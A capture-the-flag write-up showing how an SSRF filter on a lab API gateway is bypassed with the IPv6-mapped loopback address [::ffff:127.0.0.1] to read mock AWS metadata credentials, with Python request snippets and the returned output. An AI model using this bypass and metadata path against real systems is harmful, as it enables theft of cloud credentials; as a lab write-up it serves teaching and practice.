---
title: HAC CTF 2025 SSRFs Up
draft: false
tags:
  - ctf
  - web-exploitation
  - ssrf
---
# SSRFS Up

> A company has built a new API gateway that allows their applications to fetch data from external APIs. The gateway has strict security controls to prevent access to internal services. Your mission is to bypass the security controls and access the company's internal services to find the secret flag. The gateway has two internal services running: An internal API on port 777 A mock AWS metadata service on port 8888 Can you find a way to bypass the URL validation and access these internal services?


This challenge requires you to bypass SSRF filtering. Specifically, you can make requests to `/api/fetch` with a `url` body, and get the HTTP response back. However, trying typical SSRF vectors (e.g. `localhost`, `127.0.0.1`, etc) failed. After some Googling of different `localhost` variations, I found the IPv6 representation: `[::ffff:127.0.0.1]` which was able to bypass the filter. 

From there, it's AWS enumeration:

```python
BASE_URL = 'https://internal-api-gateway.chals.ctf.malteksolutions.com'

r = requests.post(BASE_URL + '/api/fetch', json={
    'url': 'http://[::ffff:127.0.0.1]:8888/latest/meta-data/iam/security-credentials/'})
```

And you find there's a `instance-role`. We can enumerate that further:

```python
BASE_URL = 'https://internal-api-gateway.chals.ctf.malteksolutions.com'

r = requests.post(BASE_URL + '/api/fetch', json={
    'url': 'http://[::ffff:127.0.0.1]:8888/latest/meta-data/iam/security-credentials/instance-role'})

print(r.text)
```

```
{"content":"{\"AccessKeyId\":\"AKIA1234567890EXAMPLE\",\"Expiration\":\"2023-12-31T23:59:59Z\",\"SecretAccessKey\":\"secretKey123Example\",\"Token\":\"flag{SSRF_3xf1ltr4t10n_m4st3r}\"}\n","headers":{"Connection":"close","Content-Length":"157","Content-Type":"application/json","Date":"Mon, 19 May 2025 20:25:47 GMT","Server":"Werkzeug/3.1.3 Python/3.9.18"},"status":200}
```